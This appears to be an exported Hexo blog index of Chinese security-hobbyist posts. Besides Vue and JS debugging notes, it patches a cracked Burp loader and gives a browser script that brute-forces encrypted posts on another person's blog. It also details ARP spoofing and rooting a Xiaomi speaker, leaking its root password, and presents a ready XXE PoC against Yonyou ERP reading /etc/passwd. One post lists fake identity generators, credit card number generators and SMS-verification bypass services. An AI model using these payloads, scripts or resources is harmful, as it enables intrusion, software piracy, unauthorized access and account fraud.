<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mac上多版本burp共存]]></title>
    <url>%2F2020%2F09%2F08%2Fmac%E4%B8%8A%E5%A4%9A%E7%89%88%E6%9C%ACburp%E5%85%B1%E5%AD%98%2F</url>
    <content type="text"><![CDATA[#0x00 背景某天群里有人问mac上如何共存多个版本的burp，大家都知道这个问题的本质是多版本jdk来驱动burp的问题，本来想想只需要更改环境变量来切换不同的java_home就好了吧，但其实好像并没有那么简单 #0x01 常规尝试首先我们要实现的是希望有多个burp的app图标，然后每个burp的图标点击就能启动不同的burp类似于：要实现这个我们得用到mac自带的automator：这玩意是真的好用，可以将很多命令操作或者宏打包成一个app，我们现在要用的是打包一个shell脚本，思路很简单，通过automator的shell，编写通过shell的方式运行指定的burploader就行：类似于这样，就可以打包成一个app，然后就自动打开burp了好了回到正题，正常思路下我们可能会想到通过在shell里指定运行的java命令的版本就行，比如：12cd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91xxx/xxx/xx/jdk14/bin/java -jar Loader.jar 看似可行，实则不行 ##0x02 问题分析其实我们在shell里指定特定版本的java来运行loader的时候，这个loader确实是以该版本的java来运行的，我们要知道，loader只是为了破解，真正运行burp本身程序的是loader通过调用命令来运行的。loader调用命令的时候执行的是：可以看到loader执行的依旧是“java”，也就是没有指定特定路径的java，那么他肯定是从环境变量去查找java，找到的那个Java是什么版本就是什么版本。那么问题来了，我们在shell里加入环境变量可不可行？1234export JAVA_HOME=xxxx/xxx/xxx/jdk14export PATH=xxxx/xxx/xxxx/bin:$PATHcd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91xxx/xxx/xx/jdk14/bin/java -jar Loader.jar 看起来可行，但是我试了，不行，看起来是这个环境变量只被loader继承了，并没有影响到loader调用命令时候的“java”，网上查了查，感觉讲的都不太靠谱，不深究，结果看来是依然调用的是系统本身的环境变量指向的java，也就是我本机老的1.8版本，那咋整呢？我试过修改/usr/libexec/java_home这个玩意管理的javahome，将jdk14放入到目录/Library/Java/JavaVirtualMachines/并修改iplist的优先级，这会改变系统默认的jdk版本，重启后确实会生效，但是这个太脑残了 ##0x03 换个思路环境变量这个坑不想搞了，万一系统搞坏了也挺傻逼的，那怎么办呢？既然通过指定jdk路径里的java来执行可以成功，那我们能不能把loader里面的java命令改成特定jdk里的java来运行burp呢？确实可以首先，我们用jd-gui打开loader.jar(红线部分是loader里run的那个命令，这里的java路径已经被我修改过了，没有修改的情况下应该就是写这个java)我们可以看到jd已经帮我们反编译了，但是我们不能直接在jd里修改，那么我们先保存，保存后jd会保存为源码的形式再获得保存的源码后，我们用idea创建一个java工程，然后把这些源码放到src里修改划线部分，指定jdk14里的java来执行后续的burp修改完毕后，最重要的是编译了，要想完整的编译可能会有一大堆问题，反正我没有直接build项目成功过。这边建议只编译enjoy.reversing.me这个包（右键点击包名选择单独构建），这样报错少，我这边就报了一个错，根据提示改一下就编译成功了接下来只需要将我们需要的keygendialog.class文件即修改过编译好的class文件复制出来最后比较简单了，将原先的loader.jar用zip解压缩后，用上面的class替换同名class文件，然后重新压缩成zip后将后缀改为jar即可修改后的jar包经过测试可以正常以特定的java来运行burp了，也不需要去修改系统的java版本了，很环保很开心。剩下的就是回到最初用automator来做一个启动app即可 ##0x04 总结 环境变量这个问题还是没怎么搞清楚，找个时间再看看，也可能有更科学的方式来做这个事情吧 很多事情还是要多试试才知道，脑补不太可行]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一次对hexo加密文章的解密尝试]]></title>
    <url>%2F2020%2F08%2F21%2F%E4%B8%80%E6%AC%A1%E5%AF%B9hexo%E5%8A%A0%E5%AF%86%E6%96%87%E7%AB%A0%E7%9A%84%E8%A7%A3%E5%AF%86%E8%AF%95%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[#0x00背景某天群里分享了一个大佬的博客，文章都是很棒的，但是最新的文章都使用Hexo-Blog-Encrypt，网上基本也都推荐这个插件进行加密文章。那么我们想看文章又不知道密码，怎么办呢？ #0x01思路一开始觉得至少先试试爆破吧，但是打开burp发现输入密码的过程是前端js的解密流程，并不存在提交到服务端的请求包，所以burp的常规爆破就不行了。那基本的思路就是这样： 先看看加解密代码，如果代码比较垃圾可能可以绕过 如果是正常的对称加密，则考虑爆破 爆破可以浏览器模拟也可以其他语言重新加解密函数提高爆破速度 #0x02先看js由于博客是托管在GitHub上的，所以直接通过github克隆一份下来在本地会比较简单一些，当然直接打开也可以（由于特殊原因该博客必须克隆）略过一些查找的过程，我们很快就找到了加解密的js文件文件路径是xxx.com/lib/blog-encrypt.js基本上可以看到使用了aes-cbc 256位加密，使用sha-256进行hash校验，只要写的没有太大问题应该不存在绕过的方式，基本上目前我只能使用爆破的方法了 #0x03爆破前置准备目前我打算直接使用js来进行爆破，爆破的流程基本上是：前端提交密码字典文件-&gt;解析成字典-&gt;js直接提交密码触发对应解密函数-&gt;构造解密成功和失败的结果显示逻辑想好了，这里介绍几个基本的知识点 ##chrome浏览器overridedevtools里有个override功能可以用本地的js脚本替代页面上的原脚本功能路径：sources-&gt;overrides这个功能的操作基本上就是先开启这个功能，然后以后在source-&gt;page里修改了某个js，就会直接在overrides里生成一个修改过的js做替换，后续只要修改overrides里的替换文件就会在对应网站里生效，哪怕是关掉浏览器下次访问也一样会以本地修改文件来生效，还是很靠谱的。 ##tampermonkey脚本的基本使用这个也没什么好说的，会大致写就行，其实本质上就是在页面加载完成后（顺序可以设置）在页面上执行额外的自定义脚本，我们的主要爆破程序是写在这里的 #0x04编写爆破脚本编写的时候涉及到不少的问题，比如： 输入密码错误的时候会弹窗提示，alert会中断所有脚本的执行，所以需要在js里把对应的alert给干掉，大部分都在那个encrypt脚本里自己找一下就行 解密成功但是校验失败会输出乱码，不太懂这什么原因，部分密码输入都会出现这种问题，通过修改一些判断逻辑使这个不影响爆破 页面输入框会在一些情况下被替换掉导致中断爆破，因此如果解密成功或者校验失败，使其作用于一个新的元素避免影响输入框直接贴爆破脚本好了，我懒得分析一些细节，而且我目前还没有爆破出密码，也不太确定是不是哪里有问题，不过思路可以参考一下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081// ==UserScript==// @name 解密hexo// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author You// @match http://127.0.0.1:8000/*// @grant none//@run-at document-end// ==/UserScript==(function() &#123; &apos;use strict&apos;; //创建一个元素用于上传密码字典 var uploadfile = document.createElement(&apos;input&apos;); uploadfile.type=&quot;file&quot;; uploadfile.id=&quot;file_id&quot;; //在上传字典后调用readFile函数 uploadfile.onchange= readFile; document.body.appendChild(uploadfile); //创建ui事件用于向密码输入框发送keydown事件 var event = document.createEvent(&apos;UIEvents&apos;); event.initUIEvent(&quot;keydown&quot;,false,true,null); event.keyCode=13; var passwords = &quot;&quot;; var i =0; function readFile() &#123; //获取文件内容判断是否为空不为空读取文件内容 const objFile = document.getElementById(&apos;file_id&apos;); if(objFile.value === &apos;&apos;) &#123; alert(&apos;请选择文件！&apos;); return; &#125; // 获取文件 const files = objFile.files; // 新建一个FileReader const reader = new FileReader(); // 读取文件 reader.readAsText(files[0], &quot;UTF-8&quot;); // 读取完文件之后会回来这里 reader.onload = function(e)&#123; // 读取文件内容 const fileString = e.target.result; //读取出来的文件内容是纯文本未分行的，下面根据换行分割成数组 const fileString2 = e.target.result.split(&apos;\n&apos;); //打印内容助于排错 console.log(fileString2); passwords = fileString2; //加个timeout主要是我怕读文件太慢，异步所以稳一点 setTimeout(function()&#123; if(passwords!=&quot;&quot;)&#123; //通过interval来控制速度，同样因为异步，怕出错所以用了interval降低速度 var inter = setInterval(function()&#123; //使用debug来输出每次密码，用于排错和知道进度，因为debug的信息可以隐藏 console.debug(passwords[i]);//设置密码空间的值为密码，并且发送keydown事件触发解密函数 document.getElementById(&quot;hbePass&quot;).value=passwords[i]; document.getElementById(&apos;hexo-blog-encrypt&apos;).dispatchEvent(event); setTimeout(function()&#123; if(i&lt;passwords.length)&#123; i++; &#125; &#125;,20); //passwords是全局变量，这里通过控制i的自增来遍历passwords if(i==passwords.length)&#123; //当密码爆破完中断interval clearInterval(inter); &#125; &#125;,5); &#125; &#125;,500); &#125;; &#125; // Your code here...&#125;)(); #0x05效果这里加了个上传文件的input，上传完就开始自动爆破如果我前面的调整没有问题，那么爆破正确的话console.log会输出正确正文不过到我写完文章我也没有爆破成功- -]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js调试技巧]]></title>
    <url>%2F2020%2F06%2F21%2FJS%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[#js调试的一些技巧 ##0x00 使用Chrome调试 ###1.devtools使用Chrome自带的devtools进行直接调试基本上已经能满足绝大部份需求，抛开常见的断点、单步调试不说，我们来说说如何使用devtools对js进行修改调试。要实现这个功能主要是用devtools里的sources板块： 在souces板块里我们注意到左侧有几个选项：page、filesystem、overrides、content scripts、snippets。这里我主要讲一下overrides和snippets。 ####snippets这个比较简单，更像是个可以执行一小段js的小功能，贴入任何js，可以单击run然后就执行了： ####overrides这个功能比较像是直接通过本地文件修改js然后在线调试，其实不用这个功能我们也可以直接在page页面里通过选中特定的js直接进行编辑修改，但是这有个问题就是如果我们刷新页面修改就失效了，而这个ovrrides的功能就是类似于用本地的文件夹保存被我们修改过的文件，类似于持久化保存的概念，那么只要我们对任何该网站的源码进行修改（html、css、js），对应修改的部分就会在本地文件夹里生成一个修改版，后续就会用这个修改版覆盖网页源文件。操作步骤： 1. 设置overrides的本地文件夹 2. 通过elements修改html、css 3. 通过source-》page修改js（**只能修改源文件不能修改formate后的文件**） 4. 修改后需要保存，command+S后就会进行保存，保存后会在override里生成文件 操作十分简单，如果觉得修改没有格式化的js文件比较麻烦，可以先任意修改源文件，等待生成overrids文件后，后续直接在overrids里的js进行修改，这种方式是可以进行formate的，这样就很方便了，即使页面刷新也会直接执行: ###2.使用Chrome插件这个其实已经很常规了，推荐几个插件吧，具体的也不演示了： Vue devtools，调试vue用的，会探测页面中是否使用vue tampermonkey，在页面中任意执行脚本，这个不用过多介绍了 ##0x01 使用vscode调试js在项目文件夹里加入： 1234567&#123; &quot;type&quot;: &quot;chrome&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Chrome against file&quot;, &quot;sourceMaps&quot;:false, &quot;file&quot;: &quot;$&#123;workspaceRoot&#125;/index.html&quot;&#125; 会以文件的方式访问启动debug打开index.html如果要以webserver的形式访问localhost的服务的话得启动一个webserver，可以通过配置或者自己启动，默认的配置需要自己启动一个webserver。下面是一个nodejs的调试配置：12345678910111213141516171819202122232425262728293031&#123; &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;node&quot;, &quot;request&quot;: &quot;attach&quot;, &quot;name&quot;: &quot;Attach by Process ID&quot;, &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;, &quot;skipFiles&quot;: [ &quot;&lt;node_internals&gt;/**&quot; ] &#125;, &#123; &quot;type&quot;: &quot;node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;启动程序&quot;, &quot;skipFiles&quot;: [ &quot;&lt;node_internals&gt;/**&quot; ], &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;\\app.js&quot; &#125;, &#123; &quot;type&quot;: &quot;node&quot;, &quot;request&quot;: &quot;attach&quot;, &quot;name&quot;: &quot;Node: Nodemon&quot;, &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;, &quot;restart&quot;: true, &quot;protocol&quot;: &quot;inspector&quot;, &#125; ]&#125;]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对小爱音箱的初步探索（一）]]></title>
    <url>%2F2020%2F06%2F11%2F%E5%AF%B9%E5%B0%8F%E7%88%B1%E9%9F%B3%E7%AE%B1%E7%9A%84%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[##0x01使用bettercap进行中间人劫持小爱音箱和我在同一个wifi下，最简单的方式就是通过arp攻击加上流量重定向到代理上进行匿名代理拦截，大致掩饰一下bettercap的流程：这个环境下，我的mbp和小爱处于一个wifi下，小爱的地址是192.168.23.145，我开启arp攻击欺骗小爱，然后启用anyproxy功能将小爱的80流量引导到我的mbp上的burp端口10001。另外burp这边的proxy上要勾选这个选项攻击成功后，我就能在burp上抓到小爱的80流量了。 ##0x02通过串口方式打开ssh很无奈，小爱绝大部分都是https流量，我用上面同样的方式引导443到10001上，抓不到https，burp直接报证书校验错误。可见小爱大部分流量都是https并且校验证书。为了获得更大的权限我现在只能将小爱敲开，然后通过串口进入他的身体后开启ssh：找到了串口后焊上排针插上杜邦线后连出来，这里我直接把他连出来方便以后用通过usb转串口连上，putty设置成串口115200波特率，就能看到输出了：可以看到，小爱其实是个LEDE的路由器（现在叫openwrt） ##0x03获取root后分析小爱的相关情况首先我要做的是开启ssh：123rm /etc/dropbear/*dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_keydropbear -r /etc/dropbear/dropbear_rsa_host_key 其中dropbear是嵌入式设备中爱用的一个ssh服务，执行完毕以上三句后试试是否可以SSH连接了，网上说root密码是空，然而并不是，我也懒得改密码直接打开/etc/shadow里抄出来放到cmd5里解密，这条记录是收费的。解密得到密码：moer123456至此就可以连接了。 随后我们ps一下看一下：可以看到一些mi带头的服务，那些基本就是小米的服务，还有一些其他的大部分也是。 接下来看一下开机脚本init.d中的内容，东西挺多的我也不举例了，这里我改了开机脚本里miio的选项，打开了debug日志：然后重启一下好了（即便你说只需要重启应用就行，但是我就喜欢reboot）重启完后tail一下/tmp/log/miio.log就能看到很多有趣的东西了，有时候即使抓不到包，这个debug日志里也会打印部分请求体。 ##0x04尝试通过修改配置文件饶过https证书校验目前看来总共有三块https要绕过： ####1. /usr/share/mico/messaging/messaging.conf 包含了初始化的一些接口大概展示一下配置文件：通过替换里面的https为http(上图是已经替换了的)，可以绕过部分接口的https问题，并且看下来http也是支持的可以不用强制转为https。 ####2. /usr/share/mico/messaging/mediaplayer.cfg 包含了另一些接口，同时有信任的CA证书路径对于该文件有两种思路，一种是替换里面的https为http，另一种是将ca证书路径更改为burp的证书路径。我试试看第二种看看行不行，即指改动certs文件夹的路径，更改后的文件夹是我自己建的，里面放的是burp的ca证书后面我放弃了改ca路径，还是回到https替换成http的思路上来了。 ####3. 替换pub文件/usr/share/mico/messaging/messaging.conf 有记录了一个pub文件，猜测是校验特定接口的公钥时候用的，目前看来可能是*.ai.xiaomi.com这个地址的pub文件绕过思路是通过burp的ca生成一个pub来替换。 先从burp中导出私钥通过命令openssl rsa -inform DER -in priburp -pubout -out burp.pub生成公钥文件，然后上传到小爱上去替换掉原来的server_2.pub文件修改配置文件中的pub文件配置为burp.pub ####4. 重启一下，见证奇迹三个操作都做完了，我们重启后分别观察是否正常………………OK，并不行，主要是第三个pub文件替换没有效果，看起来那个account-dcm.ai.xiaomi.com地址的https并不受这几个pub文件控制（至少我把我能看到的pub文件都替换了）。OK换个思路，我直接去找包含这个域名的文件，结果如下：既然找到了这个so，我直接修改这个so里的https到http试一下吧，为了以防万一我先备份一个，然后直接vim修改so里的https为http，结果保存一下再重启………………好吧没什么用，看日志似乎直接报错了，估计得放弃部分接口的https了（这一个so后面得再研究一下） ####5. 认栽，还原so和pub文件还原so和pub文件，为了让https通过，我们将信任证书路径的操作也还原，统一该用https替换http的方式来抓取部分接口先做测试吧。最终结果如下： ####6. 一些问题虽然已经是可以抓到部分接口的包了，但是一开始我们将这些接口替换成http后，部分接口会出现403错误，这个时候我们需要将他们再重新定向到443端口：这样那些443的接口就会正常了，但是这又会导致部分原本就是http的接口出现没有响应，因为他们也被强制定向到443了。这个问题手工到时候再解决一下。 ##0x05 总结暂时先到这里，针对抓包而言，arp欺骗到代理，基本上是什么都能抓的，唯一比较麻烦的是https的证书校验。抛开https，其他的tcp、udp其实也是可以这样直接劫持修改的。后面我会继续没事折腾一下小爱，还是挺好玩的，这次分享的话就先在这里结束掉吧。 PS：如果有人因为看了这个而去抓包怼小爱接口找到了万把块钱的漏洞，希望能请我喝杯瑞幸咖啡。]]></content>
      <categories>
        <category>杂类</category>
      </categories>
      <tags>
        <tag>杂类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue的学习（下）]]></title>
    <url>%2F2020%2F04%2F12%2Fvue%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8B%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 表单直接看这个里面的示例吧https://www.runoob.com/vue2/vue-forms.html 0x01 组件全局组件1234567891011121314&lt;div id="app"&gt; &lt;runoob&gt;&lt;/runoob&gt;&lt;/div&gt; &lt;script&gt;// 注册Vue.component('runoob', &#123; template: '&lt;h1&gt;自定义组件!&lt;/h1&gt;'&#125;)// 创建根实例new Vue(&#123; el: '#app'&#125;)&lt;/script&gt; 局部组件123456789101112131415161718&lt;div id="app"&gt; &lt;runoob&gt;&lt;/runoob&gt;&lt;/div&gt; &lt;script&gt;var Child = &#123; template: '&lt;h1&gt;自定义组件!&lt;/h1&gt;'&#125; // 创建根实例new Vue(&#123; el: '#app', components: &#123; // &lt;runoob&gt; 将只在父模板可用 'runoob': Child &#125;&#125;)&lt;/script&gt; prop：父组件向子组件传递信息Prop可以理解为组件设定的某个“属性”，父组件通过设置组件的这个属性来动态传递参数123456789101112131415161718192021222324&lt;div id="app"&gt; &lt;div&gt; &lt;input v-model="parentMsg"&gt; &lt;br&gt; &lt;child v-bind:message="parentMsg"&gt;&lt;/child&gt; &lt;/div&gt;&lt;/div&gt; &lt;script&gt;// 注册Vue.component('child', &#123; // 声明 props props: ['message'], // 同样也可以在 vm 实例中像 "this.message" 这样使用 template: '&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;'&#125;)// 创建根实例new Vue(&#123; el: '#app', data: &#123; parentMsg: '父组件内容' &#125;&#125;)&lt;/script&gt; prop验证参数1234567891011121314151617181920212223242526272829303132333435&lt;script&gt;Vue.component('my-component', &#123; props: &#123; // 基础的类型检查 (`null` 和 `undefined` 会通过任何类型验证) propA: Number, // 多个可能的类型 propB: [String, Number], // 必填的字符串 propC: &#123; type: String, required: true &#125;, // 带有默认值的数字 propD: &#123; type: Number, default: 100 &#125;, // 带有默认值的对象 propE: &#123; type: Object, // 对象或数组默认值必须从一个工厂函数获取 default: function () &#123; return &#123; message: 'hello' &#125; &#125; &#125;, // 自定义验证函数 propF: &#123; validator: function (value) &#123; // 这个值必须匹配下列字符串中的一个 return ['success', 'warning', 'danger'].indexOf(value) !== -1 &#125; &#125; &#125;&#125;)&lt;/script&gt; 自定义事件：子组件向父组件传递信息子组件需要向父组件传递一些信息的时候，可以通过事件触发的形式，父组件通过v-on来监听特定事件，监听的时候是可以传递参数的.①由于父组件需要参数，所以在父组件中的标签上定义自定义事件，在事件内部获取参数；『@myEvent=” callback”在callback函数中接收参数』②在子组件中触发自定义事件，并传参。『this.$ emit(‘父组件中的自定义事件’,参数)』 组件间通信非父子组件间一般通过新建一个空的vue实例，来作为中间件进行通信：123456789101112131415161718192021222324252627&lt;div id="app12"&gt;&lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;&lt;my-component12&gt;&lt;/my-component12&gt;&lt;/div&gt;&lt;script&gt;var bus = new Vue();//建立空的bus实例Vue.component('my-component12',&#123; template: '&lt;button @click="updateMessage"&gt;传递事件信息&lt;/button&gt;', methods: &#123; updateMessage: function()&#123; bus.$emit('updateMessage','更新我的组件信息'); //利用中介bus传播事件&#125;&#125;&#125;);var app12 = new Vue(&#123; el: '#app12', data:&#123; message: '' &#125;,mounted: function()&#123; var _this = this; //这一步赋值必须有 bus.$on('updateMessage',function(data)&#123; //利用中介bus接收事件 _this.message = data;&#125;)&#125;&#125;);&lt;/script&gt; 组件的data关于组件里的data属性，一般建议要写成函数形式，避免多个组件实例里相互影响，如果是常数的话可以不用12345data:function()&#123;return &#123;xxx:111&#125;&#125; 0x02 自定义指令简单的示例：12345678910111213141516171819&lt;div id="app"&gt; &lt;p&gt;页面载入时，input 元素自动获取焦点：&lt;/p&gt; &lt;input v-focus&gt;&lt;/div&gt; &lt;script&gt;// 注册一个全局自定义指令 v-focusVue.directive('focus', &#123; // 当绑定元素插入到 DOM 中。 inserted: function (el) &#123; // 聚焦元素 el.focus() &#125;&#125;)// 创建根实例new Vue(&#123; el: '#app'&#125;)&lt;/script&gt; 这是全局的，类似的，在实例里通过directives属性可以设置一个局部的更多可以看：https://www.runoob.com/vue2/vue-custom-directive.html感觉不会常用 0x03 路由（重要）https://www.runoob.com/vue2/vue-routing.html 0x04 ajax（axios）Vue2.0推荐axios，https://www.runoob.com/vue2/vuejs-ajax-axios.html GET和POST实例都一样的GET换成POST就好了1234567891011121314151617181920212223242526&lt;div id="app"&gt; &lt;h1&gt;网站列表&lt;/h1&gt; &lt;div v-for="site in info" &gt; &#123;&#123; site.name &#125;&#125; &lt;/div&gt;&lt;/div&gt;&lt;script type = "text/javascript"&gt;new Vue(&#123; el: '#app', data () &#123; return &#123; info: null &#125; &#125;, mounted () &#123; axios .get('https://www.runoob.com/try/ajax/json_demo.json') .then(response =&gt; (this.info = response.data.sites)) .catch(function (error) &#123; // 请求失败处理 console.log(error); &#125;); &#125;&#125;)&lt;/script&gt; 传参两种写法：123456789101112131415161718192021// 直接在 URL 上添加参数 ID=12345axios.get('/user?ID=12345') .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); // 也可以通过 params 设置参数：axios.get('/user', &#123; params: &#123; ID: 12345 &#125; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); 执行多个请求1234567891011function getUserAccount() &#123; return axios.get('/user/12345');&#125; function getUserPermissions() &#123; return axios.get('/user/12345/permissions');&#125;axios.all([getUserAccount(), getUserPermissions()]) .then(axios.spread(function (acct, perms) &#123; // 两个请求现在都执行完成 &#125;)); 0x05 简单实例https://www.runoob.com/vue2/vue-examples.html 0x06 常用框架https://element.eleme.cn/#/en-UShttps://vuetifyjs.com/zh-Hans/getting-started/quick-start/]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些不太健康的资料]]></title>
    <url>%2F2020%2F04%2F11%2F%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%A4%AA%E5%81%A5%E5%BA%B7%E7%9A%84%E8%B5%84%E6%96%99%2F</url>
    <content type="text"><![CDATA[1、美国身份生成器http://www.haoweichi.com/ 2、判断美国号码是实体号还是虚拟号的网站https://freecarrierlookup.com/ 3、信用卡生成http://www.e4dai.com/tool/CreditCard.asp 4、在线接收验证码网站SMSReceiveFree：https://smsreceivefree.comReceive SMS Online for FREE：https://www.receive-sms-online.infoReceive a SMS Online：https://receive-a-sms.comFree SMS Numbers Online：https://smsnumbersonline.comReceive SMS online for Free：https://sms-online.co/receive-free-smsReceive-SMS：https://receive-sms.comReceive FREE SMS online：http://receivefreesms.comRECEIVE SMS ONLINE：https://www.receivesmsonline.netFree Online Phone：https://www.freeonlinephone.orgReceive SMS Online：http://receive-sms-online.comTextNow：https://www.textnow.comTextfree：https://www.pinger.com/text-freeSELLAITE：http://sms.sellaite.comTwilio：https://www.twilio.com国内接码(z-sms)：http://www.z-sms.com国内接码：https://www.pdflibr.com 5、2020年4月安卓上可用打码具体使用方法可以参考本站里面的 神话接码 教程, 下面给大家整理一些2020年可用的安卓, PC端短信接码平台如下: 爱码: http://www.aimajiema.com 路虎: http://www.luhujiema.com 飞享: http://feixiang.taixingwds.com/ 神妈: http://202.79.167.29/ 蓝狐: http://xiangjiuer.cn/ 番茄: http://ifanqie.cc/ 米粒: http://www.yyyung.cn:9000/index.html 乌龟: http://wuguima.cn/ 新妈: http://www.xinma1.com:10001/home.html]]></content>
      <categories>
        <category>黑产</category>
      </categories>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用友ERP的XXE]]></title>
    <url>%2F2020%2F03%2F25%2F%E7%94%A8%E5%8F%8BERP%E7%9A%84XXE%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425用友的老洞了 XXE（playload见附件）POST /uapws/soapFormat.ajax HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Content-Type: application/x-www-form-urlencodedX-Requested-With: xmlHttpRequestContent-Length: 563Connection: closeCookie: JSESSIONID=04471ECB344BF351BCD35FB2E823A913.ncMem02; SaveStateCookie=Server%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%3AIServiceEntryPointPortType%2Cnc.uap.oba.update.IUpdateService%2Cnc.uap.oba.update.IUpdateService%3AIUpdateServicePortType%2Cnc.uap.oba.wordWebservice.IServiceEntry%2Cnc.uap.oba.wordWebservice.IServiceEntry%3AIServiceEntryPortType%2Cnc.itf.msgcenter.IMsgCenterWebService%2Cnc.itf.msgcenter.IMsgCenterWebService%3AIMsgCenterWebServicePortType%2Ctbb%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%2Cnc.itf.tb.outlineversion.TbbOutlineUpateVersionService%3ATbbOutlineUpateVersionServicePortType%2Cuapmp%2Cuapbs%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%2Cnc.itf.tb.oba.INtbOBAWebService%2Cnc.itf.tb.oba.IOBAMasterNodeWebService%3AIOBAMasterNodeWebServicePortType%2Cnc.itf.tb.oba.INtbOBAWebService%3AINtbOBAWebServicePortType%2Criaam%2Cnc.pubitf.rbac.IUserPubServiceWS%2Cnc.pubitf.rbac.IUserPubServiceWS%3AIUserPubServiceWSPortType%2Cbqrtofr%2Cnc.uap.oba.ws.IObaReportService%2Cnc.uap.oba.ws.IObaReportService%3AIObaReportServicePortType%2Cnc.itf.bap.oba.IObaExcelService%2Cnc.itf.bap.oba.IObaExcelService%3AIObaExcelServicePortType%2Caeam%2Cnc.itf.bap.service.IBapIOService%2Cnc.itf.bap.service.IBapIOService%3AIBapIOServicePortType%2Cnc.uap.oba.word.webservice.IServiceEntryPoint%2Caedsm%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%2Cuap.pubitf.ae.meta.ImetaWebService4BqCloud%3AImetaWebService4BqCloudPortType%2Cuap.pubitf.ae.meta.ImetaWebService%2Cuap.pubitf.ae.meta.ImetaWebService%3AImetaWebServicePortType; JSESSIONID=03FAE0AA99984716E2B0BF9BE46A1040.ncMem02msg=&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server%26xxe%3B&lt;/faultcode&gt;&lt;faultstring&gt;java.lang.RuntimeException: can not find datasource: ?&lt;/faultstring&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;]]></content>
      <categories>
        <category>poc</category>
      </categories>
      <tags>
        <tag>poc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一个frida调试瑞幸的过程]]></title>
    <url>%2F2020%2F03%2F06%2F%E5%85%B3%E4%BA%8ECORS%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[0x00 起因Chrome缓存和CORS这个文章里记录的Chrome缓存存在问题，在Access-Control-Allow-Origin:* 且Access-Control-Allow-Credentials: false的情况下可能可以获取到敏感信息（credentials可能是true也行）， 0x01 前提先说一下关于这两个头部值的一些问题： 当Access-Control-Allow-Origin:*时，credentials不能设置为true，设置为true可能会报错？（不确定），可以设置为false，设置为false不报错，不设置默认应该也是false，即允许任何域时不允许ajax请求传递敏感头部 当Access-Control-Allow-Origin: 某域名时，credentials设置true则是常见的配置漏洞，设置为false时浏览器如果发起ajax时设置withcredentials为true则报错 当不设置时默认为null，即拒绝除本域以外所有的域名0x02 与csrf相比如果文中所说的属实，那么这个漏洞存在应该很久了，而且利用条件很低，目测只要有敏感接口并且设置了Access-Control-Allow-Origin:*，那么这个接口就变成了一个在Chrome浏览器下接近于csrf漏洞。比较一下这个漏洞和jsonp、csrf的差别：jsonp得存在callback的jsonp接口，存在这种接口，并且会根据cookies返回敏感信息，因为script标签会传递cookies所以就变成了csrf，防范手段也和csrf类似，但接口必须是支持jsonp格式的json接口一般csrf一般的csrf通常是构造html表单并自动提交，通常是触发特定动作而不能获取到数据这个缓存漏洞一般的通过js去拉取数据需要cors配置为Access-Control-Allow-Origin: 某域名且credentials设置true，利用该第三方域名可控来获取敏感数据，但如果配合Chrome缓存问题，可以把这个origin扩大到任意域名，但有个潜在的条件是需要用户先访问目标接口后缓存了页面数据，才可以读取该接口的返回数据。换句话说利用条件： 没有csrf防御 存在敏感信息或有利用价值的东西 origin为星号 用户在这之前用Chrome浏览器访问过该接口 